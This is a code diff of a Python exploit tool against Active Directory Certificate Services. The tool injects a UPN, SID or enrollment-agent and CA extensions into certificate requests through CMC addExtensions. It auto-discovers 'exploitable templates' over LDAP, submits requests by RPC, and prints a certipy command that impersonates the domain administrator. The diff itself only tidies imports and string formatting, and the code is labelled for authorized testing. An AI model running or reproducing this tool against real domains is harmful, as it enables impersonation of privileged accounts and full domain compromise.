@@ -33,12 +33,10 @@ For authorized testing only. You break it into a network you don't own, that's o
 import argparse
 import base64
 import hashlib
-import os
 import re
 import struct
 import sys
 import uuid
-import datetime
 
 import requests
 import urllib3
@@ -46,11 +44,9 @@ import ldap3
 
 from cryptography import x509
 from cryptography.hazmat.primitives import hashes, serialization
-from cryptography.hazmat.primitives.asymmetric import rsa, padding
+from cryptography.hazmat.primitives.asymmetric import rsa
 from cryptography.hazmat.primitives.serialization import pkcs12
-from cryptography.x509.oid import NameOID, ObjectIdentifier
-from cryptography.x509 import DNSName, RFC822Name, OtherName
-from cryptography.hazmat.backends import default_backend
+from cryptography.x509.oid import NameOID
 
 urllib3.disable_warnings()
 
@@ -167,7 +163,6 @@ def build_upn_san_der(upn_str):
     explicit_val = der_ctx_constructed(0, upn_utf8)
     # OtherName ::= SEQUENCE { type-id OID, value [0] EXPLICIT ANY }
     other_name_content = der_oid(OID_UPN) + explicit_val
-    other_name = der_seq(other_name_content)
     # GeneralName otherName [0] IMPLICIT OtherName
     # Since OtherName is SEQUENCE (constructed), [0] IMPLICIT = [0] constructed
     gen_name = der_ctx_constructed(0, other_name_content)
@@ -324,7 +319,6 @@ def sid_str_to_binary(sid_str: str) -> bytes:
 
 def sid_binary_to_str(sid_binary: bytes) -> str:
     """Convert raw binary SID bytes to 'S-1-5-21-...' string."""
-    import struct
     rev = sid_binary[0]
     n_sub = sid_binary[1]
     auth = int.from_bytes(sid_binary[2:8], 'big')
@@ -465,7 +459,7 @@ def build_pkidata(csr_der, upn_str, sid_binary=None, inject_eku=None, inject_tem
         # keyCertSign=bit5, cRLSign=bit6, digitalSignature=bit0 in RFC 5280 bit order
         # Encoded byte: bit0=MSB -> digitalSig=0x80, keyCertSign=0x04, cRLSign=0x02 -> 0x86
         extensions.append(build_key_usage_extension(bits=0x86, critical=True))
-        print(f"[*] CA cert extensions injected: basicConstraints CA:TRUE pathLen:0 + keyUsage keyCertSign+cRLSign+digitalSignature")
+        print("[*] CA cert extensions injected: basicConstraints CA:TRUE pathLen:0 + keyUsage keyCertSign+cRLSign+digitalSignature")
 
     ctrl_attrs = b''
 
@@ -736,7 +730,6 @@ def rpc_submit_cmc(ca_host: str, ca_name: str, domain: str,
     """
     from impacket.dcerpc.v5 import transport, icpr
     from impacket.dcerpc.v5.nrpc import checkNullString
-    from impacket.dcerpc.v5.ndr import NDRSTRUCT
 
     CR_IN_CMC          = 0x00000400
     CRYPT_ASN_ENCODING = 0x00000001
@@ -927,7 +920,7 @@ def find_vulnerable_templates(dc_ip: str, domain: str, username: str, password: 
     if blocked:
         print(f"    Blocked (CA will overwrite injected SAN): {', '.join(blocked)}")
     if vulnerable:
-        print(f"    Exploitable templates:")
+        print("    Exploitable templates:")
         for t in vulnerable:
             flags_note = []
             if t['enrolleeSuppliesSubject']:
@@ -1099,7 +1092,7 @@ def main():
         if not args.dc_ip or not args.dc_pass:
             ap.error("--template is required unless --dc-ip and --dc-pass are provided for auto-discovery")
         domain_for_ldap = _domain_from(args.inject_upn)
-        print(f"[*] No --template specified - scanning AD for exploitable templates ...")
+        print("[*] No --template specified - scanning AD for exploitable templates ...")
         templates = find_vulnerable_templates(
             dc_ip=args.dc_ip,
             domain=domain_for_ldap,
@@ -1122,7 +1115,7 @@ def main():
             print("[-] --auto-signer requires --dc-pass")
             sys.exit(1)
         domain = rpc_domain
-        print(f"[*] --auto-signer: enrolling throwaway cert via PKCS#10 RPC ...")
+        print("[*] --auto-signer: enrolling throwaway cert via PKCS#10 RPC ...")
         signer_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
         signer_csr_der = build_plain_csr('cmc-autosigner', signer_key)
         # Signer cert only needs to be CA-issued - does NOT need to be the injection
@@ -1158,7 +1151,7 @@ def main():
         print(f"[*] Signer: {signer_cert.subject.rfc4514_string()}")
 
     # Fresh key for the certificate being requested (separate from signer key)
-    print(f"[*] Generating fresh RSA-2048 key for enrollment...")
+    print("[*] Generating fresh RSA-2048 key for enrollment...")
     new_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
     print(f"[*] Building plain CSR (no SAN) with subject CN={args.subject_cn}")
     csr_der = build_plain_csr(args.subject_cn, new_key)
@@ -1181,9 +1174,9 @@ def main():
             print(f"    Binary ({len(sid_binary)}B): {sid_binary.hex()}")
         except Exception as e:
             print(f"[-] LDAP SID lookup failed: {e}")
-            print(f"[!] Continuing without SID extension (use --inject-sid to set manually)")
+            print("[!] Continuing without SID extension (use --inject-sid to set manually)")
     else:
-        print(f"[~] No SID injection (use --dc-ip for auto-lookup or --inject-sid for manual)")
+        print("[~] No SID injection (use --dc-ip for auto-lookup or --inject-sid for manual)")
 
     if args.inject_upn:
         print(f"[*] Injecting SAN via id-cmc-addExtensions: UPN={args.inject_upn}")
@@ -1195,7 +1188,7 @@ def main():
                              inject_ca_cert=args.inject_ca_cert)
     print(f"[*] PKIData size: {len(pki_data)} bytes")
 
-    print(f"[*] Signing CMC with signer cert...")
+    print("[*] Signing CMC with signer cert...")
     cmc_der = build_signed_cmc(pki_data, signer_cert, signer_key)
     print(f"[*] CMC SignedData size: {len(cmc_der)} bytes")
 
@@ -1283,7 +1276,7 @@ def main():
         print(f"[+] Certificate received ({len(cert_der)} bytes) but could not parse.")
         sys.exit(1)
 
-    print(f"[+] Certificate issued!")
+    print("[+] Certificate issued!")
     print(f"    Subject:  {issued.subject.rfc4514_string()}")
     print(f"    Serial:   {issued.serial_number:x}")
     print(f"    NotAfter: {issued.not_valid_after_utc}")
@@ -1296,13 +1289,13 @@ def main():
         if args.inject_upn and args.inject_upn.lower() in san_str.lower():
             print(f"\n[!!!] VULNERABILITY CONFIRMED: Injected UPN '{args.inject_upn}' found in SAN!")
             print(f"      Template {args.template} does NOT need ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME")
-            print(f"      id-cmc-addExtensions bypasses the extension allowlist in certsrv.exe")
+            print("      id-cmc-addExtensions bypasses the extension allowlist in certsrv.exe")
         else:
             print(f"[~] SAN present but injected UPN not found: {san_str}")
     except x509.ExtensionNotFound:
-        print(f"    SAN:      [NOT PRESENT - bypass did not inject SAN into issued cert]")
-        print(f"[~] SAN not in issued cert. Extensions may be disabled (EXTENSION_DISABLE_FLAG).")
-        print(f"    Check pending request in CA database for the set extension.")
+        print("    SAN:      [NOT PRESENT - bypass did not inject SAN into issued cert]")
+        print("[~] SAN not in issued cert. Extensions may be disabled (EXTENSION_DISABLE_FLAG).")
+        print("    Check pending request in CA database for the set extension.")
 
     # Check other interesting extensions
     for ext_class in [x509.BasicConstraints, x509.KeyUsage, x509.ExtendedKeyUsage]:
@@ -1321,16 +1314,16 @@ def main():
                 if oid in present_oids:
                     print(f"\n[!!!] EKU INJECTION CONFIRMED: OID {oid} present in issued cert EKU!")
                     if oid == OID_CERT_REQ_AGENT:
-                        print(f"      -> This cert is an ENROLLMENT AGENT cert!")
-                        print(f"      -> Use for ESC3-phase2: certipy req -u testuser@lab.local -p PASSWORD \\")
-                        print(f"                 -ca CORP-ROOT-CA -target SRV03 \\")
-                        print(f"                 -template User -on-behalf-of 'LAB\\administrator' \\")
+                        print("      -> This cert is an ENROLLMENT AGENT cert!")
+                        print("      -> Use for ESC3-phase2: certipy req -u testuser@lab.local -p PASSWORD \\")
+                        print("                 -ca CORP-ROOT-CA -target SRV03 \\")
+                        print("                 -template User -on-behalf-of 'LAB\\administrator' \\")
                         print(f"                 -pfx {args.out} -pfx-password {args.pfx_pass}")
                 else:
                     print(f"[~] EKU OID {oid} NOT found in issued cert - CA blocked injection or merged differently")
         except x509.ExtensionNotFound:
             if inject_eku_list:
-                print(f"[~] No EKU extension in issued cert - injection may have been stripped")
+                print("[~] No EKU extension in issued cert - injection may have been stripped")
 
     # Save PFX
     pfx = pkcs12.serialize_key_and_certificates(
